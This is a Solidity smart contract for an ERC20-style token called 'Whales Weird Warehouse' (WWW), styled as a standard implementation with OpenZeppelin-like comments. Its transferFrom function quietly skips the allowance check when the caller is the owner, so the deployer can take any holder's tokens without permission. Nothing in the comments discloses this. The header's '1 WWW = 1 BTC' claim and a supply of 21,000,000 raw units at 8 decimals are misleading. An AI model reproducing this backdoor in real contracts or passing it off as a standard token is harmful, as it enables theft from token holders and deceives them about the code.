//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

/** 1 WWW = 1 BTC */
contract WWW {
    /** Ownable */
    address public owner;

    /** ERC20 Metadata */
    string public name = "Whales Weird Warehouse";
    string public symbol = "WWW";
    uint8 public decimals = 8;

    /** ERC20 */
    uint256 public totalSupply = 21000000;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor() {
        owner = msg.sender;
        _balances[owner] = totalSupply;
    }

    /**
     * @dev Returns the amount of tokens owned by `whale`.
     */
    function balanceOf(address whale) external view returns (uint256) {
        return _balances[whale];
    }

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `whale` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address whale, address spender)
        external
        view
        returns (uint256)
    {
        return _allowances[whale][spender];
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(
        address whale,
        address spender,
        uint256 amount
    ) internal virtual {
        _allowances[whale][spender] = amount;
        emit Approval(whale, spender, amount);
    }

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        uint256 currentAllowance = _allowances[sender][msg.sender];
        if (msg.sender != owner) {
            require(
                currentAllowance >= amount,
                "transfer amount exceeds allowance"
            );
            _approve(sender, msg.sender, currentAllowance - amount);
        }

        _transfer(sender, recipient, amount);
        return true;
    }

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for a `whale` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed whale,
        address indexed spender,
        uint256 value
    );
}

